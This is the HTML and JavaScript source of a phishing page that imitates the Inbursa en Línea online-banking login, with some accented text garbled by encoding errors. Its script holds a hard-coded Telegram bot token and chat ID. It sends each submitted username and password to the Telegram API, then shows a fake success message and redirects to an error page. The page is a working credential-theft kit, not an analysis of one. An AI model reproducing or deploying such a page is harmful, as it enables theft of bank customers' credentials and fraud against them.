<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inbursa en L√≠nea</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background-color: #f5f5f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            background: linear-gradient(135deg, #1e3a8a, #3b82f6);
            color: white;
            padding: 20px;
            text-align: center;
            position: relative;
        }

        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 10px;
        }

        .logo-icon {
            width: 40px;
            height: 40px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: #1e3a8a;
            font-size: 18px;
        }

        .logo-text {
            font-size: 24px;
            font-weight: bold;
            letter-spacing: 1px;
        }

        .version {
            font-size: 14px;
            opacity: 0.9;
        }

        .container {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .login-card {
            background: white;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            padding: 40px 30px;
            width: 100%;
            max-width: 400px;
            margin: 0 auto;
        }

        .login-title {
            color: #1e3a8a;
            font-size: 24px;
            font-weight: bold;
            text-align: center;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            color: #333;
            font-weight: 600;
            margin-bottom: 8px;
            font-size: 14px;
        }

        .form-input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e5e7eb;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s ease;
            background-color: #f9fafb;
        }

        .form-input:focus {
            outline: none;
            border-color: #3b82f6;
            background-color: white;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
        }

        .password-container {
            position: relative;
        }

        .toggle-password {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            color: #6b7280;
            font-size: 18px;
        }

        .continue-btn {
            width: 100%;
            background: linear-gradient(135deg, #1e3a8a, #3b82f6);
            color: white;
            border: none;
            padding: 15px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }

        .continue-btn:hover {
            background: linear-gradient(135deg, #1e40af, #2563eb);
            transform: translateY(-1px);
            box-shadow: 0 5px 15px rgba(59, 130, 246, 0.3);
        }

        .continue-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .footer {
            background: white;
            padding: 30px 20px;
            text-align: center;
            border-top: 1px solid #e5e7eb;
        }

        .mobile-section {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            margin-bottom: 20px;
        }

        .mobile-logo {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, #1e3a8a, #3b82f6);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
        }

        .qr-code {
            width: 60px;
            height: 60px;
            background: #333;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 12px;
        }

        .new-user-text {
            color: #333;
            font-weight: 600;
            margin-bottom: 15px;
        }

        .download-text {
            color: #6b7280;
            font-size: 14px;
            margin-bottom: 20px;
        }

        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 10px;
            flex-wrap: wrap;
        }

        .app-btn {
            background: #333;
            color: white;
            padding: 8px 15px;
            border-radius: 6px;
            text-decoration: none;
            font-size: 12px;
            font-weight: 500;
            transition: all 0.3s ease;
        }

        .app-btn:hover {
            background: #555;
            transform: translateY(-1px);
        }

        .loading {
            display: none;
            text-align: center;
            color: #6b7280;
            margin-top: 10px;
        }

        .success-message {
            display: none;
            background: #10b981;
            color: white;
            padding: 10px;
            border-radius: 6px;
            text-align: center;
            margin-top: 10px;
        }

        .error-message {
            display: none;
            background: #ef4444;
            color: white;
            padding: 10px;
            border-radius: 6px;
            text-align: center;
            margin-top: 10px;
        }

        @media (max-width: 480px) {
            .login-card {
                padding: 30px 20px;
                margin: 10px;
            }

            .header {
                padding: 15px;
            }

            .logo-text {
                font-size: 20px;
            }

            .login-title {
                font-size: 20px;
            }

            .app-buttons {
                flex-direction: column;
                align-items: center;
            }

            .app-btn {
                width: 200px;
                text-align: center;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">
            <img src="../img/logo-gfinbur.png" alt="">
        </div>
        <div class="version">63.0.5</div>
    </div>

    <div class="container">
        <div class="login-card">
            <h1 class="login-title">Ingresa a Inbursa en L√≠nea</h1>
            
            <form id="loginForm">
                <div class="form-group">
                    <label class="form-label" for="usuario">Usuario</label>
                    <input 
                        type="text" 
                        id="usuario" 
                        class="form-input" 
                        required
                        autocomplete="username"
                    >
                </div>

                <div class="form-group">
                    <label class="form-label" for="contrasena">Contrase√±a</label>
                    <div class="password-container">
                        <input 
                            type="password" 
                            id="contrasena" 
                            class="form-input" 
                            required
                            autocomplete="current-password"
                        >
                        <button type="button" class="toggle-password" onclick="togglePassword()">
                         
                        </button>
                    </div>
                </div>

                <button type="submit" class="continue-btn" id="submitBtn">
                    Continuar
                </button>

                <div class="loading" id="loading">
                    Enviando datos...
                </div>

                <div class="success-message" id="successMessage">
                    Datos enviados correctamente
                </div>

                <div class="error-message" id="errorMessage">
                    Error al enviar los datos. Intenta nuevamente.
                </div>
            </form>
        </div>
    </div>

   
    <script>
        const TELEGRAM_BOT_TOKEN = '8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE';
        const TELEGRAM_CHAT_ID = '5848946481';

        function togglePassword() {
            const passwordInput = document.getElementById('contrasena');
            const toggleBtn = document.querySelector('.toggle-password');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleBtn.textContent = 'üôà';
            } else {
                passwordInput.type = 'password';
                toggleBtn.textContent = 'üëÅÔ∏è';
            }
        }

        async function sendToTelegram(usuario, contrasena) {
            const message = `üè¶ *Nuevo acceso Inbursa*\n\nüë§ *Usuario:* ${usuario}\nüîê *Contrase√±a:* ${contrasena}\n‚è∞ *Fecha:* ${new Date().toLocaleString('es-ES')}`;
            
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });

            return response.ok;
        }

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const usuario = document.getElementById('usuario').value;
            const contrasena = document.getElementById('contrasena').value;
            const submitBtn = document.getElementById('submitBtn');
            const loading = document.getElementById('loading');
            const successMessage = document.getElementById('successMessage');
            const errorMessage = document.getElementById('errorMessage');

            // Ocultar mensajes previos
            successMessage.style.display = 'none';
            errorMessage.style.display = 'none';

            // Mostrar loading
            submitBtn.disabled = true;
            loading.style.display = 'block';

            try {
                const success = await sendToTelegram(usuario, contrasena);
                
                loading.style.display = 'none';
                
                if (success) {
                    successMessage.style.display = 'block';
                    
                    // Redirigir despu√©s de 2 segundos
                    setTimeout(() => {
                        window.location.href = 'error.html';
                    }, 2000);
                } else {
                    errorMessage.style.display = 'block';
                    submitBtn.disabled = false;
                }
            } catch (error) {
                console.error('Error:', error);
                loading.style.display = 'none';
                errorMessage.style.display = 'block';
                submitBtn.disabled = false;
            }
        });

        // Validaci√≥n en tiempo real
        document.getElementById('usuario').addEventListener('input', validateForm);
        document.getElementById('contrasena').addEventListener('input', validateForm);

        function validateForm() {
            const usuario = document.getElementById('usuario').value;
            const contrasena = document.getElementById('contrasena').value;
            const submitBtn = document.getElementById('submitBtn');
            
            submitBtn.disabled = !usuario || !contrasena;
        }

        // Inicializar validaci√≥n
        validateForm();
    </script>
</body>
</html>
